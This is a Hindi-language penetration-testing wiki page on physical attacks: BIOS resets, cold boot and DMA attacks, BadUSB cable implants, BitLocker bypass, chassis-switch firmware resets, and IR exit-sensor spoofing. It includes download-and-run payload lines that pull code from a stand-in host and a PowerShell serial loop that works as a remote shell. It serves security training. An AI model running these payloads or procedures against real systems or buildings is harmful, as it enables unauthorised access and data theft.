# भौतिक हमले

{{#include ../banners/hacktricks-training.md}}

## BIOS पासवर्ड रिकवरी और सिस्टम सुरक्षा

**BIOS रीसेट करना** कई तरीकों से किया जा सकता है। ज्यादातर मदरबोर्ड में एक **बैटरी** होती है जिसे लगभग **30 मिनट** के लिए निकालने पर BIOS सेटिंग्स (पासवर्ड सहित) रीसेट हो जाती हैं। वैकल्पिक रूप से, मदरबोर्ड पर एक **jumper** को समायोजित करके विशेष पिनों को जोड़कर इन सेटिंग्स को रीसेट किया जा सकता है।

जहाँ हार्डवेयर समायोजन संभव या व्यावहारिक नहीं होते, वहाँ **software tools** एक समाधान प्रदान करते हैं। **Live CD/USB** से सिस्टम चलाने पर जैसे वितरणों में **Kali Linux**, आपको **_killCmos_** और **_CmosPWD_** जैसे टूल्स तक पहुंच मिलती है, जो BIOS पासवर्ड रिकवरी में मदद कर सकते हैं।

यदि BIOS पासवर्ड अज्ञात है, तो उसे गलत तरीके से **तीन बार** दर्ज करने पर आम तौर पर एक एरर कोड मिलता है। इस कोड का उपयोग [https://bios-pw.org](https://bios-pw.org) जैसी वेबसाइटों पर कर के संभावित रूप से उपयोगी पासवर्ड प्राप्त किया जा सकता है।

### UEFI सुरक्षा

परंपरागत BIOS की बजाय **UEFI** वाले आधुनिक सिस्टम्स में, टूल **chipsec** का उपयोग UEFI सेटिंग्स का विश्लेषण और संशोधन करने के लिए किया जा सकता है, जिसमें **Secure Boot** को अक्षम करना भी शामिल है। इसे निम्नलिखित कमांड के साथ किया जा सकता है:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM पावर कट होने के बाद थोड़े समय तक डाटा रखता है, आमतौर पर **1 to 2 minutes**. इस अवधि को ठंडे पदार्थों (जैसे तरल नाइट्रोजन) लगाने से **10 minutes** तक बढ़ाया जा सकता है। इस बढ़ी हुई अवधि के दौरान, विश्लेषण के लिए **memory dump** को **dd.exe** और **volatility** जैसे टूल्स का उपयोग करके बनाया जा सकता है।

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** एक टूल है जो DMA के माध्यम से **physical memory manipulation** के लिए बनाया गया है, और यह **FireWire** और **Thunderbolt** जैसे इंटरफेस के साथ compatible है। यह मेमोरी को patch करके लॉगिन प्रक्रियाओं को बायपास करने और किसी भी password को स्वीकार करने के लिए सक्षम बनाता है। हालांकि, यह **Windows 10** सिस्टम पर प्रभावी नहीं है।

---

## Live CD/USB for System Access

System binaries जैसे **_sethc.exe_** या **_Utilman.exe_** को **_cmd.exe_** की कॉपी से बदलने से system privileges के साथ command prompt मिल सकता है। **chntpw** जैसे टूल का उपयोग Windows इंस्टॉलेशन की **SAM** फ़ाइल को edit करने के लिए किया जा सकता है, जिससे password बदलना संभव होता है।

**Kon-Boot** एक टूल है जो Windows kernel या UEFI को अस्थायी रूप से modify करके बिना password जाने Windows systems में login करना आसान बनाता है। अधिक जानकारी के लिए देखिए [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: BIOS सेटिंग्स तक पहुँचने के लिए।
- **F8**: Recovery mode में प्रवेश।
- Windows banner के बाद **Shift** दबाने से autologon bypass किया जा सकता है।

### BAD USB Devices

Rubber Ducky और Teensyduino जैसे डिवाइस bad USB डिवाइस बनाने के प्लेटफ़ॉर्म के रूप में काम करते हैं, जो target computer से connected होने पर predefined payloads execute कर सकते हैं।

### Volume Shadow Copy

Administrator privileges PowerShell के माध्यम से संवेदनशील फाइलों की copies बनाने की अनुमति देते हैं, जिनमें **SAM** फ़ाइल भी शामिल है।

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 आधारित implants जैसे **Evil Crow Cable Wind** USB-A→USB-C या USB-C↔USB-C केबलों के अंदर छिपते हैं, सिर्फ़ एक USB keyboard के रूप में enumerate करते हैं, और अपना C2 stack Wi-Fi पर expose करते हैं। ऑपरेटर को बस victim host से केबल को power करना होता है, `Evil Crow Cable Wind` नाम का hotspot password `123456789` के साथ बनाना होता है, और embedded HTTP interface तक पहुँचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या इसके DHCP address) पर ब्राउज़ करना होता है।
- ब्राउज़र UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, और *Config* के टैब होते हैं। Stored payloads OS के अनुसार tag किए जाते हैं, keyboard layouts ऑन-द-फ्लाई switch होते हैं, और VID/PID strings को बदलकर जाने-माने peripherals की नकल की जा सकती है।
- चूंकि C2 केबल के अंदर रहता है, एक फोन बिना host OS को छुए payloads को stage कर सकता है, execution trigger कर सकता है, और Wi-Fi credentials manage कर सकता है—कम dwell-time physical intrusions के लिए आदर्श।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद चलाने के लिए बाइंड करते हैं। Implant हल्का OS fingerprinting करता है और मेल खाने वाला script चुनता है।
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- चूंकि execution unattended है, बस एक charging cable बदलने से logged-on user context में “plug-and-pwn” initial access हासिल किया जा सकता है।

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** A stored payload opens a console and pastes a loop that executes whatever arrives on the new USB serial device. एक न्यूनतम Windows वेरिएंट इस प्रकार है:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** इम्प्लांट USB CDC चैनल को खुला रखता है जबकि इसका ESP32-S3 ऑपरेटर के पास एक TCP client (Python script, Android APK, या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए किसी भी बाइट को ऊपर बताए गए serial loop में फॉरवर्ड किया जाता है, जिससे air-gapped hosts पर भी remote command execution संभव होता है। आउटपुट सीमित होता है, इसलिए operators आमतौर पर blind commands चलाते हैं (account creation, staging additional tooling, आदि)।

### HTTP OTA update surface

- वही web stack आम तौर पर unauthenticated firmware updates एक्सपोज़ करता है। Evil Crow Cable Wind `/update` पर सुनता है और जो भी binary upload किया जाता है उसे flash कर देता है:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators के पास mid-engagement के दौरान बिना केबल खोले features को hot-swap करने की क्षमता होती है (उदा., flash USB Army Knife firmware), जिससे implant नए capabilities की ओर pivot कर सकता है जबकि वह target host में plug रहता है।

## Bypassing BitLocker Encryption

यदि किसी memory dump फ़ाइल (**MEMORY.DMP**) में **recovery password** मिल जाए तो BitLocker एन्क्रिप्शन संभवतः बायपास किया जा सकता है। इसके लिए **Elcomsoft Forensic Disk Decryptor** या **Passware Kit Forensic** जैसे tools का उपयोग किया जा सकता है।

---

## Social Engineering for Recovery Key Addition

Social engineering तकनीकों के माध्यम से नया BitLocker recovery key जोड़ा जा सकता है — उपयोगकर्ता को ऐसा command चलाने हेतु मनाया जाता है जो शून्य (zeros) से बना नया recovery key जोड़ देता है, जिससे decryption प्रक्रिया सरल हो जाती है।

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

कई आधुनिक laptops और small-form-factor desktops में एक **chassis-intrusion switch** होता है जिसे Embedded Controller (EC) और BIOS/UEFI firmware द्वारा मॉनिटर किया जाता है। जबकि इस switch का मुख्य उद्देश्य डिवाइस खुलने पर alert उठाना है, vendors कभी-कभी एक **undocumented recovery shortcut** भी लागू करते हैं जो switch को किसी विशिष्ट pattern में toggle करने पर ट्रिगर होता है।

### How the Attack Works

1. The switch is wired to a **GPIO interrupt** on the EC.
2. Firmware running on the EC keeps track of the **timing and number of presses**.
3. When a hard-coded pattern is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.
4. On next boot, the BIOS loads default values – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) के लिए recovery shortcut है:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **केवल एक पेचकस**।

### Generic Exploitation Procedure

1. Power-on या suspend-resume कर के लक्ष्य डिवाइस को चलाएँ ताकि EC सक्रिय हो।
2. नीचे का कवर हटाएँ ताकि intrusion/maintenance switch दिखाई दे।
3. vendor-specific toggle pattern को पुनरुत्पादित करें (दस्तावेज़, फ़ोरम देखें, या EC firmware को reverse-engineer करें)।
4. फिर से असेंबल करें और reboot करें — firmware protections निष्क्रिय हो जानी चाहिए।
5. एक live USB (जैसे Kali Linux) से बूट करें और सामान्य post-exploitation क्रियाएँ करें (credential dumping, data exfiltration, malicious EFI binaries को implant करना, आदि)।

### Detection & Mitigation

* OS management console में chassis-intrusion इवेंट्स को लॉग करें और अनअपेक्षित BIOS रिसेट्स के साथ उनसे कर्रिलेट करें।
* स्क्रू/कवर खोलने का पता लगाने के लिए **छेड़छाड़-सूचक सीलें** लगाएँ।
* डिवाइसेज़ को **भौतिक रूप से नियंत्रित क्षेत्रों** में रखें; मान लें कि भौतिक पहुँच का मतलब पूर्ण समझौता है।
* जहाँ उपलब्ध हो, vendor “maintenance switch reset” feature को अक्षम करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation आवश्यक बनवाएँ।

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- सामान्य “wave-to-exit” sensors एक near-IR LED emitter को एक TV-remote style receiver module के साथ जोड़ते हैं जो केवल तब लॉजिक high रिपोर्ट करता है जब उसने सही carrier (≈30 kHz) के कई pulses (~4–10) देख लिये हों।
- एक प्लास्टिक श्रोड emitter और receiver को सीधे एक-दूसरे को देखने से रोकता है, इसलिए controller यह मानता है कि कोई मान्य carrier नज़दीकी परावर्तन से आया है और एक relay ड्राइव करता है जो door strike खोलता है।
- एक बार controller को लक्ष्य मौजूद दिखे तो यह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver किसी भी burst को स्वीकार करना जारी रखता है जो filtered carrier से मेल खाता हो।

### Attack Workflow
1. **Emission profile कैप्चर करें** – controller पिन्स पर एक logic analyser क्लिप करें ताकि pre-detection और post-detection दोनों waveform रिकॉर्ड हों जो internal IR LED को ड्राइव करते हैं।
2. **सिर्फ “post-detection” waveform रिप्ले करें** – stock emitter को हटाएँ/नज़रअंदाज़ करें और बाहरी IR LED को पहले से ट्रिगर किए गए पैटर्न से शुरूआत से ड्राइव करें। क्योंकि receiver केवल pulse count/frequency की परवाह करता है, यह spoofed carrier को वास्तविक परावर्तन समझता है और relay line को असर्ट करता है।
3. **Transmission गेट करें** – carrier को ट्यून किए गए bursts (उदा., कुछ दसियों मिलीसेकंड ऑन, समान ऑफ) में ट्रांसमिट करें ताकि minimum pulse count दिया जा सके बिना receiver के AGC या interference handling लॉजिक को सैचुरेट किये। लगातार emission जल्दी से sensor को अनसेन्सिटाइज़ कर देता है और relay को फायर होने से रोक देता है।

### Long-Range Reflective Injection
- बेंच LED को high-power IR diode, MOSFET driver, और focusing optics से बदलने पर लगभग ~6 m की दूरी से विश्वसनीय triggering संभव होता है।
- attacker को receiver aperture का line-of-sight जरूरी नहीं; beam को ऐसे इंटीरियर दीवारों, शेल्विंग, या door frames की ओर निशाना बनाना जो ग्लास के माध्यम से दिखाई देते हों, परावर्तित ऊर्जा को ~30° फील्ड ऑफ़ व्यू में डाल देता है और नज़दीकी हाथ हिलाने का सिमुलेशन करता है।
- क्योंकि receivers केवल कमजोर परावर्तनों की उम्मीद करते हैं, एक बहुत मजबूत बाहरी beam कई सतहों से टकराकर भी detection threshold से ऊपर रह सकती है।

### Weaponised Attack Torch
- ड्राइवर को एक commercial flashlight के अंदर एम्बेड करने से टूल को खुले में ही छुपाया जा सकता है। visible LED को receiver के बैंड से मेल खाने वाले high-power IR LED से बदलें, ≈30 kHz bursts जनरेट करने के लिए एक ATtiny412 (या समान) जोड़ें, और LED करंट को sink करने के लिए एक MOSFET इस्तेमाल करें।
- एक टेलिस्कोपिक zoom lens बीम को रेंज/प्रिसिशन के लिए तैढ़ा कर देता है, जबकि MCU नियंत्रित vibration motor बिना visible light उत्सर्जित किये modulation सक्रिय होने पर haptic पुष्टिकरण देता है।
- कुछ स्टोर किए गए modulation patterns (थोड़े अलग carrier frequencies और envelopes) के माध्यम से साइकिल करने से rebranded sensor families में कम्पैटिबिलिटी बढ़ती है, जिससे ऑपरेटर परावर्तित सतहों को sweep कर सके जब तक relay ऑडिबल क्लिक न करे और दरवाज़ा रिलीज न हो।

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
